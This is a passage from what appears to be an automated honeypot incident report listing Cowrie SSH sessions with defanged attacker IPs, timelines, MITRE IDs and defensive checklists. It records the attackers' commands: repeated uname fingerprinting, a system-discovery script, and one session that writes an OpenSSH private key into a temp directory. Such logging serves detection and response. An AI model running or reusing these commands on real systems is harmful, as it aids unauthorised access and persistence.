| `2026-08-25 05:04:02` | `cowrie.client.kex` |
| `2026-08-25 05:04:02` | `cowrie.login.success` |
| `2026-08-25 05:04:03` | `cowrie.session.params` |
| `2026-08-25 05:04:03` | `cowrie.command.input` |
| `2026-08-25 05:04:03` | `cowrie.log.closed` |
| `2026-08-25 05:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0751632da73b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:06` | `cowrie.session.connect` |
| `2026-08-25 05:04:06` | `cowrie.client.version` |
| `2026-08-25 05:04:06` | `cowrie.client.kex` |
| `2026-08-25 05:04:06` | `cowrie.login.success` |
| `2026-08-25 05:04:07` | `cowrie.session.params` |
| `2026-08-25 05:04:07` | `cowrie.command.input` |
| `2026-08-25 05:04:07` | `cowrie.log.closed` |
| `2026-08-25 05:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6069df799938

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:10` | `cowrie.session.connect` |
| `2026-08-25 05:04:10` | `cowrie.client.version` |
| `2026-08-25 05:04:10` | `cowrie.client.kex` |
| `2026-08-25 05:04:11` | `cowrie.login.success` |
| `2026-08-25 05:04:12` | `cowrie.session.params` |
| `2026-08-25 05:04:12` | `cowrie.command.input` |
| `2026-08-25 05:04:12` | `cowrie.log.closed` |
| `2026-08-25 05:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adb9c280b643

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:15` | `cowrie.session.connect` |
| `2026-08-25 05:04:15` | `cowrie.client.version` |
| `2026-08-25 05:04:15` | `cowrie.client.kex` |
| `2026-08-25 05:04:16` | `cowrie.login.success` |
| `2026-08-25 05:04:16` | `cowrie.session.params` |
| `2026-08-25 05:04:16` | `cowrie.command.input` |
| `2026-08-25 05:04:17` | `cowrie.log.closed` |
| `2026-08-25 05:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20506368d06f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:20` | `cowrie.session.connect` |
| `2026-08-25 05:04:20` | `cowrie.client.version` |
| `2026-08-25 05:04:20` | `cowrie.client.kex` |
| `2026-08-25 05:04:20` | `cowrie.login.success` |
| `2026-08-25 05:04:21` | `cowrie.session.params` |
| `2026-08-25 05:04:21` | `cowrie.command.input` |
| `2026-08-25 05:04:21` | `cowrie.log.closed` |
| `2026-08-25 05:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dc3b1a07ba2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:22` | `cowrie.session.connect` |
| `2026-08-25 05:04:23` | `cowrie.client.version` |
| `2026-08-25 05:04:23` | `cowrie.client.kex` |
| `2026-08-25 05:04:24` | `cowrie.login.success` |
| `2026-08-25 05:04:25` | `cowrie.session.params` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:25` | `cowrie.command.success` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:25` | `cowrie.command.input` |
| `2026-08-25 05:04:26` | `cowrie.log.closed` |
| `2026-08-25 05:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31b2ae95c1b4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:24` | `cowrie.session.connect` |
| `2026-08-25 05:04:24` | `cowrie.client.version` |
| `2026-08-25 05:04:24` | `cowrie.client.kex` |
| `2026-08-25 05:04:25` | `cowrie.login.success` |
| `2026-08-25 05:04:26` | `cowrie.session.params` |
| `2026-08-25 05:04:26` | `cowrie.command.input` |
| `2026-08-25 05:04:26` | `cowrie.log.closed` |
| `2026-08-25 05:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbab6ace552b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:29` | `cowrie.session.connect` |
| `2026-08-25 05:04:29` | `cowrie.client.version` |
| `2026-08-25 05:04:29` | `cowrie.client.kex` |
| `2026-08-25 05:04:29` | `cowrie.login.success` |
| `2026-08-25 05:04:30` | `cowrie.session.params` |
| `2026-08-25 05:04:30` | `cowrie.command.input` |
| `2026-08-25 05:04:30` | `cowrie.log.closed` |
| `2026-08-25 05:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f6a1c6c302

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:34` | `cowrie.session.connect` |
| `2026-08-25 05:04:34` | `cowrie.client.version` |
| `2026-08-25 05:04:34` | `cowrie.client.kex` |
| `2026-08-25 05:04:34` | `cowrie.login.success` |
| `2026-08-25 05:04:35` | `cowrie.session.params` |
| `2026-08-25 05:04:35` | `cowrie.command.input` |
| `2026-08-25 05:04:35` | `cowrie.log.closed` |
| `2026-08-25 05:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-931c11bd5321

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:39` | `cowrie.session.connect` |
| `2026-08-25 05:04:39` | `cowrie.client.version` |
| `2026-08-25 05:04:39` | `cowrie.client.kex` |
| `2026-08-25 05:04:39` | `cowrie.login.success` |
| `2026-08-25 05:04:40` | `cowrie.session.params` |
| `2026-08-25 05:04:40` | `cowrie.command.input` |
| `2026-08-25 05:04:40` | `cowrie.log.closed` |
| `2026-08-25 05:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6323b4b80b38

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:43` | `cowrie.session.connect` |
| `2026-08-25 05:04:43` | `cowrie.client.version` |
| `2026-08-25 05:04:43` | `cowrie.client.kex` |
| `2026-08-25 05:04:44` | `cowrie.login.success` |
| `2026-08-25 05:04:45` | `cowrie.session.params` |
| `2026-08-25 05:04:45` | `cowrie.command.input` |
| `2026-08-25 05:04:45` | `cowrie.log.closed` |
| `2026-08-25 05:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f2d70709aa

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:48` | `cowrie.session.connect` |
| `2026-08-25 05:04:48` | `cowrie.client.version` |
| `2026-08-25 05:04:48` | `cowrie.client.kex` |
| `2026-08-25 05:04:48` | `cowrie.login.success` |
| `2026-08-25 05:04:49` | `cowrie.session.params` |
| `2026-08-25 05:04:49` | `cowrie.command.input` |
| `2026-08-25 05:04:49` | `cowrie.log.closed` |
| `2026-08-25 05:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8db6e0fd265

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:52` | `cowrie.session.connect` |
| `2026-08-25 05:04:52` | `cowrie.client.version` |
| `2026-08-25 05:04:53` | `cowrie.client.kex` |
| `2026-08-25 05:04:53` | `cowrie.login.success` |
| `2026-08-25 05:04:54` | `cowrie.session.params` |
| `2026-08-25 05:04:54` | `cowrie.command.input` |
| `2026-08-25 05:04:54` | `cowrie.log.closed` |
| `2026-08-25 05:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b51769a83f3

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:57` | `cowrie.session.connect` |
| `2026-08-25 05:04:57` | `cowrie.client.version` |
| `2026-08-25 05:04:58` | `cowrie.client.kex` |
| `2026-08-25 05:04:58` | `cowrie.login.success` |
| `2026-08-25 05:04:59` | `cowrie.session.params` |
| `2026-08-25 05:04:59` | `cowrie.command.input` |
| `2026-08-25 05:04:59` | `cowrie.log.closed` |
| `2026-08-25 05:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc8ee309de1

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:02` | `cowrie.session.connect` |
| `2026-08-25 05:05:02` | `cowrie.client.version` |
| `2026-08-25 05:05:02` | `cowrie.client.kex` |
| `2026-08-25 05:05:02` | `cowrie.login.success` |
| `2026-08-25 05:05:03` | `cowrie.session.params` |
| `2026-08-25 05:05:03` | `cowrie.command.input` |
| `2026-08-25 05:05:03` | `cowrie.log.closed` |
| `2026-08-25 05:05:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5f4b775d2a

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:07` | `cowrie.session.connect` |
| `2026-08-25 05:05:07` | `cowrie.client.version` |
| `2026-08-25 05:05:07` | `cowrie.client.kex` |
| `2026-08-25 05:05:07` | `cowrie.login.success` |
| `2026-08-25 05:05:08` | `cowrie.session.params` |
| `2026-08-25 05:05:08` | `cowrie.command.input` |
| `2026-08-25 05:05:08` | `cowrie.log.closed` |
| `2026-08-25 05:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae64b95f4d80

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:11` | `cowrie.session.connect` |
| `2026-08-25 05:05:11` | `cowrie.client.version` |
| `2026-08-25 05:05:11` | `cowrie.client.kex` |
| `2026-08-25 05:05:12` | `cowrie.login.success` |
| `2026-08-25 05:05:13` | `cowrie.session.params` |
| `2026-08-25 05:05:13` | `cowrie.command.input` |
| `2026-08-25 05:05:13` | `cowrie.log.closed` |
| `2026-08-25 05:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34cccf8f971f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:16` | `cowrie.session.connect` |
| `2026-08-25 05:05:16` | `cowrie.client.version` |
| `2026-08-25 05:05:16` | `cowrie.client.kex` |
| `2026-08-25 05:05:17` | `cowrie.login.success` |
| `2026-08-25 05:05:17` | `cowrie.session.params` |
| `2026-08-25 05:05:17` | `cowrie.command.input` |
| `2026-08-25 05:05:17` | `cowrie.log.closed` |
| `2026-08-25 05:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9797cbeb12b7

| Field | Detail |
|---|---|
| **Source IP** | `165.245.172[.]73` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:18` | `cowrie.session.connect` |
| `2026-08-25 05:05:18` | `cowrie.client.version` |
| `2026-08-25 05:05:18` | `cowrie.client.kex` |
| `2026-08-25 05:05:19` | `cowrie.login.success` |
| `2026-08-25 05:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.172[.]73` to AbuseIPDB if not already reported
- [ ] Block `165.245.172[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2296d6d9fc2a

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:20` | `cowrie.session.connect` |
| `2026-08-25 05:05:20` | `cowrie.client.version` |
| `2026-08-25 05:05:20` | `cowrie.client.kex` |
| `2026-08-25 05:05:20` | `cowrie.login.success` |
| `2026-08-25 05:05:22` | `cowrie.session.params` |
| `2026-08-25 05:05:22` | `cowrie.command.input` |
| `2026-08-25 05:05:22` | `cowrie.session.file_download` |
| `2026-08-25 05:05:22` | `cowrie.session.file_download` |
| `2026-08-25 05:05:22` | `cowrie.log.closed` |
| `2026-08-25 05:05:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9429ae4ec82

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:21` | `cowrie.session.connect` |
| `2026-08-25 05:05:21` | `cowrie.client.version` |
| `2026-08-25 05:05:21` | `cowrie.client.kex` |
| `2026-08-25 05:05:22` | `cowrie.login.success` |
| `2026-08-25 05:05:23` | `cowrie.session.params` |
| `2026-08-25 05:05:23` | `cowrie.command.input` |
| `2026-08-25 05:05:23` | `cowrie.log.closed` |
| `2026-08-25 05:05:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf15b8c2cef6

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:26` | `cowrie.session.connect` |
| `2026-08-25 05:05:26` | `cowrie.client.version` |
| `2026-08-25 05:05:26` | `cowrie.client.kex` |
| `2026-08-25 05:05:26` | `cowrie.login.success` |
| `2026-08-25 05:05:27` | `cowrie.session.params` |
| `2026-08-25 05:05:27` | `cowrie.command.input` |
| `2026-08-25 05:05:27` | `cowrie.log.closed` |
| `2026-08-25 05:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03b6362610e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:30` | `cowrie.session.connect` |
| `2026-08-25 05:05:30` | `cowrie.client.version` |
| `2026-08-25 05:05:30` | `cowrie.client.kex` |
| `2026-08-25 05:05:31` | `cowrie.login.success` |
| `2026-08-25 05:05:31` | `cowrie.session.params` |
| `2026-08-25 05:05:31` | `cowrie.command.input` |
| `2026-08-25 05:05:32` | `cowrie.log.closed` |
| `2026-08-25 05:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8930bafa3add

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:35` | `cowrie.session.connect` |
| `2026-08-25 05:05:35` | `cowrie.client.version` |
| `2026-08-25 05:05:35` | `cowrie.client.kex` |
| `2026-08-25 05:05:35` | `cowrie.login.success` |
| `2026-08-25 05:05:36` | `cowrie.session.params` |
| `2026-08-25 05:05:36` | `cowrie.command.input` |
| `2026-08-25 05:05:36` | `cowrie.log.closed` |
| `2026-08-25 05:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7247c01fe404

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
